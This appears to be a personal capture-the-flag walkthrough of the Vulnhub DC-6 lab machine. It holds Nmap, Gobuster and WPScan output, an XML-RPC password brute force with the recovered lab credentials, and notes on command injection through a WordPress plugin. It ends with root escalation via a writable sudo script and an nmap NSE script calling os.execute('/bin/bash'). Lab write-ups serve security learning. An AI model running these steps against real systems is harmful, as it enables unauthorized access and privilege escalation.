@@ -1,0 +1,198 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-28 13:35 EDT
+Nmap scan report for dc-6 (192.168.1.6)
+Host is up (0.00058s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
+|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
+|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Did not follow redirect to http://wordy/
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.1.6:80/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/08/28 13:53:57 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/server-status (Status: 403)
+/wp-content (Status: 301)
+/wp-includes (Status: 301)
+/wp-admin (Status: 301)
+===============================================================
+2020/08/28 13:53:59 Finished
+===============================================================
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.6
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[32m[+][0m URL: http://192.168.1.6/ [192.168.1.6]
+[32m[+][0m Started: Wed Sep  2 19:54:24 2020
+
+Interesting Finding(s):
+
+[32m[+][0m Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.4.25 (Debian)
+ |  - X-Redirect-By: WordPress
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[32m[+][0m XML-RPC seems to be enabled: http://192.168.1.6/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[32m[+][0m WordPress readme found: http://192.168.1.6/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[32m[+][0m The external WP-Cron seems to be enabled: http://192.168.1.6/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[32m[+][0m WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
+ | Found By: Atom Generator (Aggressive Detection)
+ |  - http://192.168.1.6/index.php/feed/atom/, <generator uri="https://wordpress.org/" version="5.1.1">WordPress</generator>
+ | Confirmed By: Style Etag (Aggressive Detection)
+ |  - http://192.168.1.6/wp-admin/load-styles.php, Match: '5.1.1'
+
+[34m[i][0m The main theme could not be detected.
+
+[32m[+][0m Enumerating All Plugins (via Passive Methods)
+
+[34m[i][0m No plugins Found.
+
+[32m[+][0m Enumerating Config Backups (via Passive and Aggressive Methods)
+
+ Checking Config Backups -: |======================================================================================================|
+
+[34m[i][0m No Config Backups Found.
+
+[33m[!][0m No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[33m[!][0m You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[32m[+][0m Finished: Wed Sep  2 19:54:26 2020
+[32m[+][0m Requests Done: 23
+[32m[+][0m Cached Requests: 35
+[32m[+][0m Data Sent: 5.207 KB
+[32m[+][0m Data Received: 3.911 KB
+[32m[+][0m Memory used: 184.934 MB
+[32m[+][0m Elapsed time: 00:00:01
+
+[+] Performing password attack on Xmlrpc against 5 user/s
+[SUCCESS] - mark / helpdesk01 
+changed ESONhugh123456
+
+Trying jens / !lak019b Time: 00:02:01 <============================================          > (12547 / 15215) 82.46%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: mark, Password: helpdesk01
+changed ESONhugh123456
+
+
+^[[32m[+++++]^[[0m
+-----------------------------
+Vulnhub plugins: activity monitior
+wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools
+this place can exec bash when ip is x.x.x.x|bash_Command
+and you can use lookup to exec it
+we can find the file  poster.sh to see it
+
+you will see mark's ~dir  has account and password of graham
+pass:GSo7isUM1D4
+
+you can ssh it
+and get shell
+
+sudo -l
+graham has nopassword sudo exec to exec the backups.sh
+ls -al
+we can know the backups.sh can write by us
+but vim can't found on it.
+it's sad
+so we can use echo to the file
+echo "/bin/bash" >> backups.sh
+and we can sudo it
+as following command
+sudo -u jens /home/jens/backups.sh
+
+then we get another shell
+-------------------------------
+sudo -l 
+do it again
+we can find 
+we can nopassword to exec the nmap
+i got no idea
+but nmap can use scripts on it
+we create a new file of nse
+
+-------------------------------
+then we got like this
+jens@dc-6:~$ echo "os.execute('/bin/bash')" >> new.nse
+jens@dc-6:~$ ls
+backups.sh  backups.tar.gz  new.nse
+jens@dc-6:~$ cat new.nse
+os.execute('/bin/bash')
+jens@dc-6:~$ sudo /usr/bin/nmap --script=new.nse
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2020-09-18 23:51 AEST
+root@dc-6:/home/jens# bash: lslslsls: command not found
+root@dc-6:/home/jens# backups.sh  backups.tar.gz  new.nse
+root@dc-6:/home/jens# root@dc-6:~# theflag.txt
+root@dc-6:~# cat: thefalg.txt: No such file or directory
+root@dc-6:~# root@dc-6:~# root@dc-6:~# root@dc-6:~# root@dc-6:~# 
+
+Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
+ Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
+  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
+   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+
+
+root@dc-6:~#     1  shutdown -h now
+    2  cat theflag.txt                                                                           
+    3  history                                                                                   
+root@dc-6:~#                 
